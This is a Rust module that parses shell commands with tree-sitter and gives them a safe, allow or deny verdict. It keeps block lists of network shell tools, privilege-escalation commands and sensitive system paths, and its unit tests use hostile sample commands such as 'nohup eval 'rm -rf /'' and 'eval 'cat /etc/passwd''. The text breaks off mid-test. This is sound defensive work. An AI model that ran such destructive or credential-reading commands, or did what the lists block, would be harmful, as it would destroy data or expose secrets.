//! Bash AST-based security analysis.
//!
//! Uses tree-sitter to parse shell commands into an AST and perform
//! semantic-level security analysis. Detects eval-like builtins,
//! dangerous node types, and command substitution patterns.

use std::sync::LazyLock;
use std::time::{Duration, Instant};

// ---- Constants ----

/// Builtins that can execute arbitrary code or bypass security checks.
const EVAL_LIKE_BUILTINS: &[&str] = &[
    "eval",
    "source",
    ".", // alias for source
    "exec",
    "command",
    "builtin",
    "fc",
    "coproc",
    "noglob",
    "nocorrect",
    "trap",
    "enable",
    "mapfile",
    "readarray",
    "hash",
    "bind",
    "complete",
    "compgen",
];

/// Zsh-specific dangerous builtins.
const ZSH_DANGEROUS_BUILTINS: &[&str] = &[
    "zmodload", "emulate", "sysopen", "sysread", "syswrite", "sysseek", "zpty", "ztcp", "zsocket",
    "zf_rm", "zf_mv", "zf_ln", "zf_chmod", "zf_chown", "zf_mkdir", "zf_rmdir", "zf_chgrp",
];

/// Process wrappers stripped before checking the real command.
const WRAPPER_COMMANDS: &[&str] = &["time", "nohup", "timeout", "nice", "stdbuf", "env"];

/// Network-related commands that could exfiltrate data or download payloads.
const NETWORK_COMMANDS: &[&str] = &["curl", "wget", "nc", "ncat", "socat", "ssh", "scp", "rsync"];

/// Privilege escalation commands.
const PRIVILEGE_ESCALATION_COMMANDS: &[&str] = &["sudo", "su", "doas", "run0", "pkexec"];

/// File permission modification commands.
const PERMISSION_MODIFICATION_COMMANDS: &[&str] = &["chmod", "chown", "chgrp", "chattr"];

/// Sensitive paths that should not be redirected to.
const SENSITIVE_REDIRECT_PATHS: &[&str] = &[
    "/etc/passwd",
    "/etc/shadow",
    "/etc/sudoers",
    "/boot/",
    "/dev/sd",
    "/dev/hd",
    "/dev/nvme",
    "/dev/mmcblk",
    "/dev/null",
    "/dev/zero",
    "/dev/random",
    "/dev/urandom",
    "/dev/mem",
    "/dev/kmem",
    "/dev/port",
    "/proc/sys",
    "/sys/",
    "/usr/bin/",
    "/usr/local/bin/",
    "/bin/",
    "/sbin/",
    "/lib/",
    "/lib64/",
    "/usr/lib/",
    "/usr/lib64/",
];

/// Commands that can execute code via suspicious arguments.
const CODE_EXECUTION_COMMANDS: &[&str] = &["python", "python3", "perl", "ruby", "node", "nodejs"];

/// Shell commands that accept -c for code execution.
const SHELL_COMMANDS: &[&str] = &["sh", "bash", "zsh", "dash", "ksh", "fish"];

/// Commands where -exec is dangerous.
const EXEC_COMMANDS: &[&str] = &["find", "xargs"];

/// Maximum time allowed for parsing and analysis.
const ANALYSIS_TIMEOUT_MS: u64 = 50;

/// Maximum number of AST nodes to traverse.
const MAX_NODE_COUNT: usize = 50_000;

// ---- Static parser ----

static PARSER: LazyLock<std::sync::Mutex<tree_sitter::Parser>> = LazyLock::new(|| {
    let mut parser = tree_sitter::Parser::new();
    parser
        .set_language(&tree_sitter_bash::LANGUAGE.into())
        .expect("failed to set bash language");
    std::sync::Mutex::new(parser)
});

// ---- Analysis result ----

/// Security analysis result for a Bash command.
#[derive(Debug, Clone)]
pub struct BashSecurityAnalysis {
    /// The extracted command name (argv[0]) after wrapper stripping.
    pub command_name: Option<String>,
    /// Extracted arguments after wrapper stripping.
    pub arguments: Vec<String>,
    /// Overall verdict.
    pub verdict: BashVerdict,
    /// Specific warnings detected.
    pub warnings: Vec<BashWarning>,
    /// Time spent on analysis.
    pub analysis_time_ms: u64,
    /// Number of AST nodes traversed.
    pub node_count: usize,
}

#[derive(Debug, Clone, PartialEq)]
pub enum BashVerdict {
    /// Command appears safe.
    Safe,
    /// Command has concerns but may be allowed with confirmation.
    Allow,
    /// Command should be blocked.
    Deny,
}

#[derive(Debug, Clone)]
pub struct BashWarning {
    pub kind: BashWarningKind,
    pub detail: String,
}

#[derive(Debug, Clone, PartialEq)]
pub enum BashWarningKind {
    /// eval, source, exec, etc.
    EvalLikeBuiltin,
    /// zmodload, zpty, etc.
    ZshDangerous,
    /// $(), backticks, <(), >()
    CommandSubstitution,
    /// ${...} parameter expansion
    ParameterExpansion,
    /// (subshell), {compound}, function_definition, etc.
    ComplexConstruct,
    /// Control flow: if/while/for/case
    ControlFlow,
    /// Heredoc/herestring
    Heredoc,
    /// Brace expansion {a,b}
    BraceExpansion,
    /// Process substitution <() >()
    ProcessSubstitution,
    /// Ansi-c string $'...'
    AnsiCString,
    /// Pipes, &&, ||, ;
    ShellOperators,
    /// Unknown AST node (fail-closed)
    UnknownNodeType(String),
    /// Failed to parse (fail-closed)
    ParseFailed,
    /// Variable used as command name ($cmd)
    VariableAsCommand,
    /// Suspicious arguments that may execute code
    SuspiciousArguments,
    /// Redirect to a sensitive system path
    RedirectToSensitivePath,
    /// Analysis budget (time or node count) exceeded
    AnalysisBudgetExceeded,
    /// Network-related command
    NetworkCommand,
    /// Privilege escalation command
    PrivilegeEscalation,
    /// File permission modification
    PermissionModification,
    /// Heredoc containing command substitutions or expansions
    HeredocExpansion,
}

impl BashSecurityAnalysis {
    pub fn is_dangerous(&self) -> bool {
        !matches!(self.verdict, BashVerdict::Safe)
    }

    pub fn summary(&self) -> String {
        if self.warnings.is_empty() {
            "safe".to_string()
        } else {
            self.warnings
                .iter()
                .map(|w| format!("{:?}: {}", w.kind, w.detail))
                .collect::<Vec<_>>()
                .join("; ")
        }
    }
}

// ---- Main analysis function ----

/// Analyze a Bash command string for security concerns.
pub fn analyze_command(command: &str) -> BashSecurityAnalysis {
    let start_time = Instant::now();
    let mut warnings = Vec::new();
    let mut node_count = 0usize;

    let timeout = Duration::from_millis(ANALYSIS_TIMEOUT_MS);

    // Phase 1: Pre-parse checks
    if let Some(w) = pre_parse_checks(command) {
        warnings.push(w);
    }

    // Phase 2: Parse with tree-sitter
    let tree = {
        let mut parser = match PARSER.lock() {
            Ok(p) => p,
            Err(_) => {
                warnings.push(BashWarning {
                    kind: BashWarningKind::ParseFailed,
                    detail: "parser lock poisoned".to_string(),
                });
                return BashSecurityAnalysis {
                    command_name: None,
                    arguments: vec![],
                    verdict: BashVerdict::Deny,
                    warnings,
                    analysis_time_ms: 0,
                    node_count: 0,
                };
            }
        };
        parser.parse(command, None)
    };

    let Some(tree) = tree else {
        warnings.push(BashWarning {
            kind: BashWarningKind::ParseFailed,
            detail: "tree-sitter failed to parse command".to_string(),
        });
        return BashSecurityAnalysis {
            command_name: extract_command_name_fallback(command),
            arguments: vec![],
            verdict: BashVerdict::Deny,
            warnings,
            analysis_time_ms: start_time.elapsed().as_millis() as u64,
            node_count: 0,
        };
    };

    // Phase 3: Walk AST (with node budget)
    let root = tree.root_node();
    walk_node_with_budget(&root, command, &mut warnings, &mut node_count);

    if node_count > MAX_NODE_COUNT {
        warnings.push(BashWarning {
            kind: BashWarningKind::AnalysisBudgetExceeded,
            detail: format!(
                "AST node count {} exceeded budget {}",
                node_count, MAX_NODE_COUNT
            ),
        });
        let elapsed = start_time.elapsed().as_millis() as u64;
        return BashSecurityAnalysis {
            command_name: None,
            arguments: vec![],
            verdict: BashVerdict::Deny,
            warnings,
            analysis_time_ms: elapsed,
            node_count,
        };
    }

    // Phase 4: Extract command + strip wrappers
    let (cmd_name, args) = extract_and_strip_command(&root, command);

    // Phase 5: Check command against builtin lists
    if let Some(ref name) = cmd_name {
        let name_lower = name.to_ascii_lowercase();

        if EVAL_LIKE_BUILTINS.iter().any(|b| *b == name_lower) {
            warnings.push(BashWarning {
                kind: BashWarningKind::EvalLikeBuiltin,
                detail: format!(
                    "command '{}' is an eval-like builtin that can execute arbitrary code",
                    name
                ),
            });
        }

        if ZSH_DANGEROUS_BUILTINS.iter().any(|b| *b == name_lower) {
            warnings.push(BashWarning {
                kind: BashWarningKind::ZshDangerous,
                detail: format!("command '{}' is a dangerous zsh builtin", name),
            });
        }
    }

    // Phase 6: Timeout check before Phase 2 validators
    if start_time.elapsed() > timeout {
        warnings.push(BashWarning {
            kind: BashWarningKind::AnalysisBudgetExceeded,
            detail: "analysis timeout before Phase 2 validators".to_string(),
        });
        let elapsed = start_time.elapsed().as_millis() as u64;
        return BashSecurityAnalysis {
            command_name: cmd_name,
            arguments: args,
            verdict: BashVerdict::Deny,
            warnings,
            analysis_time_ms: elapsed,
            node_count,
        };
    }

    // Phase 7: Phase 2 security validators
    warnings.extend(check_redirects(&tree, command));
    warnings.extend(check_variable_command(&tree));
    warnings.extend(check_suspicious_arguments(&tree, command));

    if start_time.elapsed() > timeout {
        warnings.push(BashWarning {
            kind: BashWarningKind::AnalysisBudgetExceeded,
            detail: "analysis timeout after argument checks".to_string(),
        });
        let elapsed = start_time.elapsed().as_millis() as u64;
        return BashSecurityAnalysis {
            command_name: cmd_name.clone(),
            arguments: args.clone(),
            verdict: BashVerdict::Deny,
            warnings,
            analysis_time_ms: elapsed,
            node_count,
        };
    }

    if let Some(ref name) = cmd_name {
        let name_lower = name.to_ascii_lowercase();
        warnings.extend(check_network_commands(&name_lower));
        warnings.extend(check_privilege_escalation(&name_lower));
        warnings.extend(check_permission_modification(&name_lower, &args));
    }

    warnings.extend(check_heredoc_expansions(&tree, command));

    // Phase 8: Determine verdict
    let verdict = determine_verdict(&warnings);
    let elapsed = start_time.elapsed().as_millis() as u64;

    BashSecurityAnalysis {
        command_name: cmd_name,
        arguments: args,
        verdict,
        warnings,
        analysis_time_ms: elapsed,
        node_count,
    }
}

// ---- Pre-parse checks ----

fn pre_parse_checks(command: &str) -> Option<BashWarning> {
    // Control characters
    let has_control = command
        .bytes()
        .any(|b| matches!(b, 0x00..=0x08 | 0x0B..=0x0C | 0x0E..=0x1F | 0x7F));
    if has_control {
        return Some(BashWarning {
            kind: BashWarningKind::ParseFailed,
            detail: "command contains control characters".to_string(),
        });
    }

    None
}

// ---- AST walking ----

fn walk_node_with_budget(
    node: &tree_sitter::Node,
    source: &str,
    warnings: &mut Vec<BashWarning>,
    node_count: &mut usize,
) {
    let kind = node.kind();
    *node_count += 1;

    // Skip safe leaf nodes
    if node.child_count() == 0 {
        return;
    }

    match kind {
        // Safe structural nodes — recurse into children
        "program"
        | "list"
        | "pipeline"
        | "redirected_statement"
        | "command"
        | "command_name"
        | "concatenation"
        | "variable_assignment"
        | "declaration_command"
        | "file_redirect" => {
            for i in 0..node.child_count() {
                if let Some(child) = node.child(i as u32) {
                    walk_node_with_budget(&child, source, warnings, node_count);
                }
            }
        }

        // Tracked but not outright blocked
        "command_substitution" => {
            let text = node_text(node, source);
            warnings.push(BashWarning {
                kind: BashWarningKind::CommandSubstitution,
                detail: format!("command substitution: {}", truncate(&text, 60)),
            });
        }

        "expansion" => {
            let text = node_text(node, source);
            warnings.push(BashWarning {
                kind: BashWarningKind::ParameterExpansion,
                detail: format!("parameter expansion: {}", truncate(&text, 60)),
            });
        }

        "process_substitution" => {
            let text = node_text(node, source);
            warnings.push(BashWarning {
                kind: BashWarningKind::ProcessSubstitution,
                detail: format!("process substitution: {}", truncate(&text, 60)),
            });
        }

        "subshell" => {
            warnings.push(BashWarning {
                kind: BashWarningKind::ComplexConstruct,
                detail: "subshell ( ... )".to_string(),
            });
            for i in 0..node.child_count() {
                if let Some(child) = node.child(i as u32) {
                    walk_node_with_budget(&child, source, warnings, node_count);
                }
            }
        }

        "compound_statement" => {
            warnings.push(BashWarning {
                kind: BashWarningKind::ComplexConstruct,
                detail: "compound statement { ... }".to_string(),
            });
            for i in 0..node.child_count() {
                if let Some(child) = node.child(i as u32) {
                    walk_node_with_budget(&child, source, warnings, node_count);
                }
            }
        }

        "function_definition" => {
            warnings.push(BashWarning {
                kind: BashWarningKind::ComplexConstruct,
                detail: "function definition".to_string(),
            });
            for i in 0..node.child_count() {
                if let Some(child) = node.child(i as u32) {
                    walk_node_with_budget(&child, source, warnings, node_count);
                }
            }
        }

        // Control flow
        "if_statement" | "for_statement" | "while_statement" | "until_statement"
        | "case_statement" => {
            warnings.push(BashWarning {
                kind: BashWarningKind::ControlFlow,
                detail: format!("control flow: {}", kind),
            });
            for i in 0..node.child_count() {
                if let Some(child) = node.child(i as u32) {
                    walk_node_with_budget(&child, source, warnings, node_count);
                }
            }
        }

        "heredoc_redirect" | "herestring_redirect" => {
            warnings.push(BashWarning {
                kind: BashWarningKind::Heredoc,
                detail: kind.to_string(),
            });
        }

        "brace_expression" => {
            let text = node_text(node, source);
            warnings.push(BashWarning {
                kind: BashWarningKind::BraceExpansion,
                detail: format!("brace expansion: {}", truncate(&text, 40)),
            });
        }

        "ansi_c_string" => {
            let text = node_text(node, source);
            warnings.push(BashWarning {
                kind: BashWarningKind::AnsiCString,
                detail: format!("ansi-c string: {}", truncate(&text, 40)),
            });
        }

        // Known safe leaf/structural nodes — no action needed
        "word"
        | "string"
        | "raw_string"
        | "simple_expansion"
        | "number"
        | "special_variable_name"
        | "environment_variable"
        | "test_operator"
        | "unsetting_command"
        | "heredoc_body"
        | "heredoc_start"
        | "heredoc_end" => {}

        // Fail-closed: unknown node types
        _ => {
            // Skip punctuation and anonymous nodes (prefixed with '.')
            if !kind.starts_with('.') && !kind.starts_with('\n') {
                warnings.push(BashWarning {
                    kind: BashWarningKind::UnknownNodeType(kind.to_string()),
                    detail: format!("unknown AST node type: {}", kind),
                });
            }
        }
    }
}

// ---- Command extraction + wrapper stripping ----

fn extract_and_strip_command(
    root: &tree_sitter::Node,
    source: &str,
) -> (Option<String>, Vec<String>) {
    let commands = collect_commands(root, source);
    let Some((name, args)) = commands.first() else {
        return (extract_command_name_fallback(source), vec![]);
    };

    // Strip wrappers
    let stripped = strip_wrappers(name.as_str(), args);
    (Some(stripped.0.to_string()), stripped.1.to_vec())
}

fn collect_commands(node: &tree_sitter::Node, source: &str) -> Vec<(String, Vec<String>)> {
    let mut commands = Vec::new();
    collect_commands_recursive(node, source, &mut commands);
    if commands.is_empty() {
        if let Some(fallback) = extract_command_name_fallback(source) {
            commands.push((fallback, vec![]));
        }
    }
    commands
}

fn collect_commands_recursive(
    node: &tree_sitter::Node,
    source: &str,
    commands: &mut Vec<(String, Vec<String>)>,
) {
    match node.kind() {
        "command" => {
            if let Some(cmd) = extract_command_from_node(node, source) {
                commands.push(cmd);
            }
        }
        "program"
        | "list"
        | "pipeline"
        | "redirected_statement"
        | "subshell"
        | "compound_statement"
        | "if_statement"
        | "for_statement"
        | "while_statement"
        | "until_statement"
        | "case_statement"
        | "function_definition" => {
            for i in 0..node.child_count() {
                if let Some(child) = node.child(i as u32) {
                    collect_commands_recursive(&child, source, commands);
                }
            }
        }
        _ => {}
    }
}

fn extract_command_from_node(
    node: &tree_sitter::Node,
    source: &str,
) -> Option<(String, Vec<String>)> {
    let mut name: Option<String> = None;
    let mut args: Vec<String> = Vec::new();

    for i in 0..node.child_count() {
        let child = node.child(i as u32)?;
        match child.kind() {
            "command_name" => {
                name = Some(node_text(&child, source));
            }
            "word" | "string" | "raw_string" | "number" | "simple_expansion" | "concatenation"
            | "expansion" => {
                let text = node_text(&child, source);
                if !text.is_empty() {
                    args.push(text);
                }
            }
            _ => {}
        }
    }

    name.map(|n| (n, args))
}

/// Strip process wrappers (time, nohup, timeout, nice, stdbuf, env).
fn strip_wrappers<'a>(name: &'a str, args: &'a [String]) -> (&'a str, &'a [String]) {
    if !WRAPPER_COMMANDS.contains(&name.to_ascii_lowercase().as_str()) {
        return (name, args);
    }

    match name {
        "time" | "nohup" => {
            // Simple: just skip the wrapper, next arg is the real command
            if args.is_empty() {
                return (name, args);
            }
            strip_wrappers(&args[0], &args[1..])
        }
        "timeout" => {
            // timeout [flags] DURATION COMMAND [args...]
            // Skip flags (--foreground, --preserve-status, --verbose, -k, -s)
            let mut i = 0;
            while i < args.len() {
                let arg = &args[i];
                if arg.starts_with("--kill-after") || arg.starts_with("--signal") {
                    // --kill-after=N (fused) or --kill-after N (separate)
                    if !arg.contains('=') {
                        i += 1; // skip value
                    }
                } else if arg.starts_with('-') && arg != "-foreground" {
                    // Short flags like -k DUR, -s SIG
                    if arg == "-k" || arg == "-s" {
                        i += 1; // skip value
                    }
                } else {
                    // This is the DURATION, next is the real command
                    i += 1;
                    break;
                }
                i += 1;
            }
            if i < args.len() {
                strip_wrappers(&args[i], &args[i + 1..])
            } else {
                (name, args)
            }
        }
        "nice" => {
            // nice [-n N] COMMAND or nice [-N] COMMAND
            if args.len() >= 2 && (args[0] == "-n" && args[1].parse::<i32>().is_ok()) {
                strip_wrappers(&args[2], &args[3..])
            } else if !args.is_empty()
                && args[0].starts_with('-')
                && args[0].len() > 1
                && args[0][1..].parse::<i32>().is_ok()
            {
                strip_wrappers(&args[1], &args[2..])
            } else {
                strip_wrappers(
                    args.first().map(|s| s.as_str()).unwrap_or(name),
                    args.get(1..).unwrap_or(args),
                )
            }
        }
        "stdbuf" | "env" => {
            // stdbuf -o0 COMMAND / env VAR=val COMMAND
            let mut i = 0;
            while i < args.len() {
                let arg = &args[i];
                if arg.contains('=') {
                    // VAR=val assignment
                } else if arg.starts_with('-') {
                    // Flags
                    if arg == "-i" || arg == "-0" || arg == "-v" {
                        // no-value flags
                    } else if arg == "-u" || arg.starts_with("-o") || arg.starts_with("-e") {
                        // -u NAME, -o0, -e0 etc
                        if !arg.contains('0') && !arg.contains('1') {
                            i += 1; // skip value
                        }
                    }
                } else {
                    // This is the real command
                    return strip_wrappers(arg, &args[i + 1..]);
                }
                i += 1;
            }
            (name, args)
        }
        _ => (name, args),
    }
}

/// Fallback: extract first word from command string without AST.
fn extract_command_name_fallback(command: &str) -> Option<String> {
    command.split_whitespace().next().map(|s| s.to_string())
}

// ---- Verdict determination ----

fn determine_verdict(warnings: &[BashWarning]) -> BashVerdict {
    let has_eval = warnings
        .iter()
        .any(|w| w.kind == BashWarningKind::EvalLikeBuiltin);
    let has_zsh = warnings
        .iter()
        .any(|w| w.kind == BashWarningKind::ZshDangerous);
    let has_parse_fail = warnings
        .iter()
        .any(|w| w.kind == BashWarningKind::ParseFailed);
    let has_unknown = warnings
        .iter()
        .any(|w| matches!(w.kind, BashWarningKind::UnknownNodeType(_)));
    let has_budget_exceeded = warnings
        .iter()
        .any(|w| w.kind == BashWarningKind::AnalysisBudgetExceeded);
    let has_redirect_sensitive = warnings
        .iter()
        .any(|w| w.kind == BashWarningKind::RedirectToSensitivePath);
    let has_variable_as_command = warnings
        .iter()
        .any(|w| w.kind == BashWarningKind::VariableAsCommand);

    // Hard deny: eval-like, zsh dangerous, parse failure, unknown nodes, budget exceeded,
    // redirect to sensitive path, variable as command
    if has_eval
        || has_zsh
        || has_parse_fail
        || has_unknown
        || has_budget_exceeded
        || has_redirect_sensitive
        || has_variable_as_command
    {
        return BashVerdict::Deny;
    }

    // Allow with warning for: command substitution, control flow, complex constructs, etc.
    if !warnings.is_empty() {
        return BashVerdict::Allow;
    }

    BashVerdict::Safe
}

// ---- Helpers ----

fn node_text(node: &tree_sitter::Node, source: &str) -> String {
    source[node.byte_range()].to_string()
}

fn truncate(s: &str, max: usize) -> String {
    if s.len() <= max {
        s.to_string()
    } else {
        format!("{}...", &s[..max])
    }
}

// ---- Phase 2 Security Validators ----

fn check_redirects(tree: &tree_sitter::Tree, source: &str) -> Vec<BashWarning> {
    let mut warnings = Vec::new();
    let root = tree.root_node();
    check_redirects_node(&root, source, &mut warnings);
    warnings
}

fn check_redirects_node(node: &tree_sitter::Node, source: &str, warnings: &mut Vec<BashWarning>) {
    if node.kind() == "file_redirect" {
        let mut redirect_op: Option<String> = None;
        let mut target_path: Option<String> = None;

        for i in 0..node.child_count() {
            if let Some(child) = node.child(i as u32) {
                let kind = child.kind();
                let text = node_text(&child, source);
                if kind == "file_descriptor" || kind == "redirect_operator" {
                    redirect_op = Some(text);
                } else if kind == "word" || kind == "string" || kind == "raw_string" {
                    target_path = Some(text);
                }
            }
        }

        if let Some(path) = target_path {
            let path_lower = path.to_ascii_lowercase();
            let is_sensitive = SENSITIVE_REDIRECT_PATHS
                .iter()
                .any(|p| path_lower.starts_with(*p));
            if is_sensitive {
                let op = redirect_op.as_deref().unwrap_or(">");
                let is_overwrite = op.contains('>') && !op.contains(">>");
                let detail = if is_overwrite {
                    format!("overwrite redirect to sensitive path: {}", path)
                } else {
                    format!("redirect to sensitive path: {}", path)
                };
                warnings.push(BashWarning {
                    kind: BashWarningKind::RedirectToSensitivePath,
                    detail,
                });
            }
        }
    }

    for i in 0..node.child_count() {
        if let Some(child) = node.child(i as u32) {
            check_redirects_node(&child, source, warnings);
        }
    }
}

fn check_variable_command(tree: &tree_sitter::Tree) -> Vec<BashWarning> {
    let mut warnings = Vec::new();
    let root = tree.root_node();
    check_variable_command_node(&root, &mut warnings);
    warnings
}

fn check_variable_command_node(node: &tree_sitter::Node, warnings: &mut Vec<BashWarning>) {
    if node.kind() == "command" {
        for i in 0..node.child_count() {
            if let Some(child) = node.child(i as u32) {
                if child.kind() == "command_name" {
                    for j in 0..child.child_count() {
                        if let Some(name_child) = child.child(j as u32) {
                            let kind = name_child.kind();
                            if kind == "simple_expansion" || kind == "expansion" {
                                warnings.push(BashWarning {
                                    kind: BashWarningKind::VariableAsCommand,
                                    detail: format!(
                                        "command name is a variable expansion: {}",
                                        kind
                                    ),
                                });
                            }
                        }
                    }
                }
            }
        }
    }

    for i in 0..node.child_count() {
        if let Some(child) = node.child(i as u32) {
            check_variable_command_node(&child, warnings);
        }
    }
}

fn check_suspicious_arguments(tree: &tree_sitter::Tree, source: &str) -> Vec<BashWarning> {
    let mut warnings = Vec::new();
    let root = tree.root_node();
    check_suspicious_arguments_node(&root, source, &mut warnings);
    warnings
}

fn check_suspicious_arguments_node(
    node: &tree_sitter::Node,
    source: &str,
    warnings: &mut Vec<BashWarning>,
) {
    if node.kind() == "command" {
        let mut cmd_name: Option<String> = None;
        let mut args: Vec<String> = Vec::new();

        for i in 0..node.child_count() {
            if let Some(child) = node.child(i as u32) {
                match child.kind() {
                    "command_name" => {
                        cmd_name = Some(node_text(&child, source).to_ascii_lowercase());
                    }
                    "word" | "string" | "raw_string" | "number" | "simple_expansion"
                    | "concatenation" | "expansion" => {
                        let text = node_text(&child, source);
                        if !text.is_empty() {
                            args.push(text);
                        }
                    }
                    _ => {}
                }
            }
        }

        if let Some(ref name) = cmd_name {
            let name_lower = name.as_str();
            // Check for python/perl/ruby/node -c, --eval/-e followed by code
            if CODE_EXECUTION_COMMANDS.contains(&name_lower) {
                for (i, arg) in args.iter().enumerate() {
                    if (arg == "--eval" || arg == "-e" || arg == "-c") && i + 1 < args.len() {
                        warnings.push(BashWarning {
                            kind: BashWarningKind::SuspiciousArguments,
                            detail: format!(
                                "{} {} '{}' may execute arbitrary code",
                                name,
                                arg,
                                args[i + 1]
                            ),
                        });
                    }
                }
            }

            // Check for shell -c
            if SHELL_COMMANDS.contains(&name_lower) {
                for (i, arg) in args.iter().enumerate() {
                    if arg == "-c" && i + 1 < args.len() {
                        warnings.push(BashWarning {
                            kind: BashWarningKind::SuspiciousArguments,
                            detail: format!("{} -c '{}' executes shell code", name, args[i + 1]),
                        });
                    }
                }
            }

            // Check for find/xargs -exec
            if EXEC_COMMANDS.contains(&name_lower) {
                for arg in &args {
                    if arg == "-exec" || arg == "-execdir" {
                        warnings.push(BashWarning {
                            kind: BashWarningKind::SuspiciousArguments,
                            detail: format!("{} with -exec may execute arbitrary commands", name),
                        });
                    }
                }
            }
        }
    }

    for i in 0..node.child_count() {
        if let Some(child) = node.child(i as u32) {
            check_suspicious_arguments_node(&child, source, warnings);
        }
    }
}

fn check_network_commands(command_name: &str) -> Vec<BashWarning> {
    let mut warnings = Vec::new();
    if NETWORK_COMMANDS.contains(&command_name) {
        warnings.push(BashWarning {
            kind: BashWarningKind::NetworkCommand,
            detail: format!("network command: {}", command_name),
        });
    }
    warnings
}

fn check_privilege_escalation(command_name: &str) -> Vec<BashWarning> {
    let mut warnings = Vec::new();
    if PRIVILEGE_ESCALATION_COMMANDS.contains(&command_name) {
        warnings.push(BashWarning {
            kind: BashWarningKind::PrivilegeEscalation,
            detail: format!("privilege escalation: {}", command_name),
        });
    }
    warnings
}

fn check_permission_modification(command_name: &str, args: &[String]) -> Vec<BashWarning> {
    let mut warnings = Vec::new();
    if PERMISSION_MODIFICATION_COMMANDS.contains(&command_name) {
        // Check if any argument targets a sensitive path
        let has_sensitive_target = args.iter().any(|arg| {
            let arg_lower = arg.to_ascii_lowercase();
            SENSITIVE_REDIRECT_PATHS
                .iter()
                .any(|p| arg_lower.starts_with(*p))
        });
        if has_sensitive_target {
            warnings.push(BashWarning {
                kind: BashWarningKind::PermissionModification,
                detail: format!("{} modifying permissions on sensitive path", command_name),
            });
        }
    }
    warnings
}

fn check_heredoc_expansions(tree: &tree_sitter::Tree, source: &str) -> Vec<BashWarning> {
    let mut warnings = Vec::new();
    let root = tree.root_node();
    check_heredoc_expansions_node(&root, source, &mut warnings);
    warnings
}

fn check_heredoc_expansions_node(
    node: &tree_sitter::Node,
    source: &str,
    warnings: &mut Vec<BashWarning>,
) {
    if node.kind() == "heredoc_body" {
        let body_text = node_text(node, source);
        if body_text.contains("$(") || body_text.contains("`${") || body_text.contains("$`{") {
            warnings.push(BashWarning {
                kind: BashWarningKind::HeredocExpansion,
                detail: "heredoc contains command substitution".to_string(),
            });
        } else if body_text.contains("${") || body_text.contains("$") {
            warnings.push(BashWarning {
                kind: BashWarningKind::HeredocExpansion,
                detail: "heredoc contains variable expansion".to_string(),
            });
        }
    }

    for i in 0..node.child_count() {
        if let Some(child) = node.child(i as u32) {
            check_heredoc_expansions_node(&child, source, warnings);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // ---- Safe commands ----

    #[test]
    fn safe_simple_commands() {
        let cases = ["ls -la", "echo hello", "pwd", "cat file.txt", "git status"];
        for cmd in cases {
            let analysis = analyze_command(cmd);
            assert_eq!(
                analysis.verdict,
                BashVerdict::Safe,
                "expected safe: {}",
                cmd
            );
            assert!(
                analysis.warnings.is_empty(),
                "unexpected warnings for: {}",
                cmd
            );
        }
    }

    // ---- Eval-like builtins ----

    #[test]
    fn detects_eval() {
        let analysis = analyze_command("eval 'cat /etc/passwd'");
        assert_eq!(analysis.verdict, BashVerdict::Deny);
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::EvalLikeBuiltin));
        assert_eq!(analysis.command_name.as_deref(), Some("eval"));
    }

    #[test]
    fn detects_source() {
        let analysis = analyze_command("source malicious.sh");
        assert_eq!(analysis.verdict, BashVerdict::Deny);
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::EvalLikeBuiltin));
    }

    #[test]
    fn detects_exec() {
        let analysis = analyze_command("exec /bin/bash");
        assert_eq!(analysis.verdict, BashVerdict::Deny);
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::EvalLikeBuiltin));
    }

    #[test]
    fn detects_dot_source() {
        // "." is the alias for source — tree-sitter parses it as command_name
        let analysis = analyze_command(". ./setup.sh");
        assert_eq!(analysis.verdict, BashVerdict::Deny);
    }

    // ---- Zsh dangerous ----

    #[test]
    fn detects_zsh_dangerous() {
        let analysis = analyze_command("zmodload zsh/system");
        assert_eq!(analysis.verdict, BashVerdict::Deny);
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::ZshDangerous));
    }

    // ---- Command substitution ----

    #[test]
    fn detects_command_substitution() {
        let analysis = analyze_command("echo $(whoami)");
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::CommandSubstitution));
        assert!(analysis.is_dangerous());
    }

    #[test]
    fn detects_backtick_substitution() {
        let analysis = analyze_command("echo `whoami`");
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::CommandSubstitution));
    }

    // ---- Wrapper stripping ----

    #[test]
    fn strips_nohup() {
        let analysis = analyze_command("nohup ls -la");
        assert_eq!(analysis.command_name.as_deref(), Some("ls"));
    }

    #[test]
    fn strips_timeout() {
        let analysis = analyze_command("timeout 5 ls -la");
        assert_eq!(analysis.command_name.as_deref(), Some("ls"));
    }

    #[test]
    fn strips_nohup_eval_detects_eval() {
        let analysis = analyze_command("nohup eval 'rm -rf /'");
        assert_eq!(analysis.verdict, BashVerdict::Deny);
        assert_eq!(analysis.command_name.as_deref(), Some("eval"));
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::EvalLikeBuiltin));
    }

    #[test]
    fn strips_time() {
        let analysis = analyze_command("time npm test");
        assert_eq!(analysis.command_name.as_deref(), Some("npm"));
    }

    // ---- Complex constructs ----

    #[test]
    fn detects_subshell() {
        let analysis = analyze_command("(cd /tmp && rm -rf *)");
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::ComplexConstruct));
    }

    #[test]
    fn detects_if_statement() {
        let analysis = analyze_command("if true; then echo yes; fi");
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::ControlFlow));
    }

    #[test]
    fn detects_for_loop() {
        let analysis = analyze_command("for i in 1 2 3; do echo $i; done");
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::ControlFlow));
    }

    #[test]
    fn detects_function_definition() {
        let analysis = analyze_command("foo() { echo bar; }");
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::ComplexConstruct));
    }

    // ---- Heredoc ----

    #[test]
    fn detects_heredoc() {
        let analysis = analyze_command("cat <<EOF\nhello\nEOF");
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::Heredoc));
    }

    // ---- Process substitution ----

    #[test]
    fn detects_process_substitution() {
        let analysis = analyze_command("diff <(ls a) <(ls b)");
        assert!(analysis
            .warnings
            .iter()
            .any(|w| w.kind == BashWarningKind::ProcessSubstitution));
    }

    // ---- Brace expansion ----

    #[test]
    fn detects_brace_expansion() {
